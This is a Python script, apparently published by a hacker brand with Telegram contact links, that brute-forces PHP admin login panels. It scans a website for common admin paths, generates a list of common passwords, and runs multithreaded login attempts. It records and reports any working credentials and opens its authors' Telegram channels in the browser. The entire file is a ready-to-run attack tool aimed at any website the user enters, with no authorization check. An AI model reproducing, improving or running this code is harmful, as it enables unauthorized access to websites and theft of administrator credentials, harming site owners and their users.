import requests
import threading
import time
import sys
import os
from datetime import datetime
import webbrowser
from urllib.parse import urljoin

class AdminPasswordChecker:
    def __init__(self):
        self.results = []
        self.found_credentials = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
    def load_passwords(self, password_file="passwords.txt"):
        """Load passwords from a file"""
        passwords = []
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Password file '{password_file}' not found.")
            print("[!] Creating a default password file with common passwords.")
            self.create_default_password_file(password_file)
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        return passwords

    def create_default_password_file(self, filename):
        """Create a default password file with common admin passwords"""
        common_passwords = [
            "admin", "password", "123456", "admin123", "password123",
            "12345678", "1234", "12345", "qwerty", "letmein",
            "welcome", "monkey", "admin@123", "Admin@123", "P@ssw0rd",
            "pass", "root", "toor", "administrator", "123456789",
            "1234567", "abc123", "password1", "test", "guest"
        ]
        with open(filename, 'w') as f:
            for pwd in common_passwords:
                f.write(pwd + '\n')

    def check_login(self, url, username, password, success_indicator=None):
        """Attempt to login with given credentials"""
        try:
            # Common login form fields for PHP admin panels
            login_data = {
                'username': username,
                'password': password,
                'login': 'Login',
                'submit': 'Submit'
            }
            
            response = self.session.post(url, data=login_data, timeout=10)
            
            # Check for successful login indicators
            if success_indicator and success_indicator in response.text:
                return True, response
            elif response.status_code == 200:
                # Common success indicators
                success_indicators = [
                    'dashboard', 'admin', 'welcome', 'logout', 'success',
                    'Dashboard', 'Admin', 'Welcome', 'Logout'
                ]
                for indicator in success_indicators:
                    if indicator in response.text and 'invalid' not in response.text.lower():
                        return True, response
            return False, response
        except Exception as e:
            return False, None

    def scan_admin_panels(self, base_url):
        """Scan for common admin panel locations"""
        common_paths = [
            "admin/", "administrator/", "login/", "admin/login/", 
            "wp-admin/", "admin.php", "login.php", "admin/login.php",
            "admin/index.php", "administrator/index.php", "panel/",
            "cpanel/", "webadmin/", "adminarea/", "admin/login.html"
        ]
        
        found_panels = []
        for path in common_paths:
            test_url = urljoin(base_url, path)
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    # Check if it looks like a login page
                    login_indicators = ['password', 'username', 'login', 'form']
                    if any(indicator in response.text.lower() for indicator in login_indicators):
                        found_panels.append(test_url)
                        print(f"[+] Found admin panel: {test_url}")
            except:
                continue
        return found_panels

    def run_attack(self, target_url, usernames, passwords, threads=5):
        """Run the password checking attack with multiple threads"""
        print(f"[*] Starting attack on: {target_url}")
        print(f"[*] Using {threads} threads")
        print(f"[*] Testing {len(usernames)} usernames and {len(passwords)} passwords")
        print("[*] Attack started at: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        print("-" * 60)
        
        def worker(username, password):
            try:
                success, response = self.check_login(target_url, username, password)
                if success:
                    print(f"[SUCCESS] Found valid credentials: {username}:{password}")
                    self.found_credentials.append({
                        'url': target_url,
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    })
                    return True
                else:
                    print(f"[TRY] {username}:{password} - Failed")
            except Exception as e:
                print(f"[ERROR] {username}:{password} - {str(e)}")
            return False
        
        # Create threads for concurrent testing
        thread_pool = []
        for username in usernames:
            for password in passwords:
                if len(thread_pool) >= threads:
                    for t in thread_pool:
                        t.join()
                    thread_pool = []
                
                t = threading.Thread(target=worker, args=(username, password))
                t.daemon = True
                t.start()
                thread_pool.append(t)
                time.sleep(0.1)  # Small delay to avoid overwhelming the server
        
        # Wait for remaining threads to complete
        for t in thread_pool:
            t.join()
        
        return self.found_credentials

    def generate_report(self):
        """Generate a professional report of found credentials"""
        if not self.found_credentials:
            return "No valid credentials found."
        
        report = """
╔══════════════════════════════════════════════════════════════╗
║                 DARKBOSS1BD - SECURITY REPORT                ║
║                    Admin Password Checker                    ║
╚══════════════════════════════════════════════════════════════╝

"""
        report += f"Report generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Total credentials found: {len(self.found_credentials)}\n\n"
        
        for i, cred in enumerate(self.found_credentials, 1):
            report += f"[{i}] URL: {cred['url']}\n"
            report += f"    Username: {cred['username']}\n"
            report += f"    Password: {cred['password']}\n"
            report += f"    Time: {cred['timestamp']}\n"
            report += "    " + "─" * 50 + "\n"
        
        report += """
╔══════════════════════════════════════════════════════════════╗
║                         CONTACT INFO                         ║
╠══════════════════════════════════════════════════════════════╣
║ Telegram: https://t.me/darkvaiadmin                         ║
║ Channel:  https://t.me/windowspremiumkey                    ║
║ Brand:    darkboss1bd                                       ║
╚══════════════════════════════════════════════════════════════╝
"""
        return report

def display_banner():
    """Display the professional hacker-themed banner"""
    banner = r"""
    
 ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ███████╗███████╗██████╗ ██╗
██╔════╝ ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝██╔════╝██╔══██╗██║
██║  ███╗███████║██████╔╝█████╔╝ ██████╔╝██║  ███╗███████╗█████╗  ██████╔╝██║
██║   ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██║   ██║╚════██║██╔══╝  ██╔══██╗╚═╝
╚██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝╚██████╔╝███████║███████╗██║  ██║██╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝
                                                                              
    ╔═════════════════════════════════════════════════════════════════════╗
    ║                  PHP ADMIN PASSWORD CHECKER TOOL                   ║
    ║                         by darkboss1bd                            ║
    ║          Telegram: @darkvaiadmin | Channel: @windowspremiumkey    ║
    ╚═════════════════════════════════════════════════════════════════════╝
    
    """
    print(banner)

def main():
    # Display banner
    display_banner()
    
    # Open Telegram links automatically
    print("[*] Opening contact links...")
    webbrowser.open("https://t.me/darkvaiadmin")
    webbrowser.open("https://t.me/windowspremiumkey")
    
    # Initialize the tool
    checker = AdminPasswordChecker()
    
    # Get target URL
    target_url = input("[?] Enter target website URL (e.g., http://example.com/): ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Scan for admin panels
    print("\n[*] Scanning for admin panels...")
    admin_panels = checker.scan_admin_panels(target_url)
    
    if not admin_panels:
        admin_url = input("[?] No admin panels auto-detected. Enter admin login URL: ").strip()
        if admin_url:
            admin_panels = [admin_url]
        else:
            print("[!] No admin panel specified. Exiting.")
            return
    
    # Select admin panel to attack
    print("\n[+] Available admin panels:")
    for i, panel in enumerate(admin_panels, 1):
        print(f"    [{i}] {panel}")
    
    try:
        choice = int(input("\n[?] Select panel to attack (number): ")) - 1
        selected_panel = admin_panels[choice]
    except (ValueError, IndexError):
        print("[!] Invalid selection. Using first panel.")
        selected_panel = admin_panels[0]
    
    # Get usernames to test
    username_input = input("\n[?] Enter usernames to test (comma-separated, default: admin): ").strip()
    if username_input:
        usernames = [u.strip() for u in username_input.split(',')]
    else:
        usernames = ['admin']
    
    # Load passwords
    password_file = input("[?] Enter password file path (default: passwords.txt): ").strip()
    if not password_file:
        password_file = "passwords.txt"
    
    passwords = checker.load_passwords(password_file)
    if not passwords:
        print("[!] No passwords loaded. Exiting.")
        return
    
    # Get thread count
    try:
        threads = int(input("[?] Enter number of threads (default: 5): ").strip() or "5")
    except ValueError:
        threads = 5
    
    print("\n" + "="*60)
    print("[*] STARTING PASSWORD CHECKING ATTACK")
    print("="*60)
    
    # Run the attack
    found_creds = checker.run_attack(selected_panel, usernames, passwords, threads)
    
    # Generate and display report
    print("\n" + "="*60)
    print("[*] GENERATING FINAL REPORT")
    print("="*60)
    
    report = checker.generate_report()
    print(report)
    
    # Save report to file
    report_filename = f"darkboss1bd_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(report_filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    print(f"[+] Report saved as: {report_filename}")
    print("\n[*] Tool execution completed!")
    print("[*] Thank you for using darkboss1bd Admin Password Checker")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user.")
    except Exception as e:
        print(f"\n[!] An error occurred: {str(e)}")
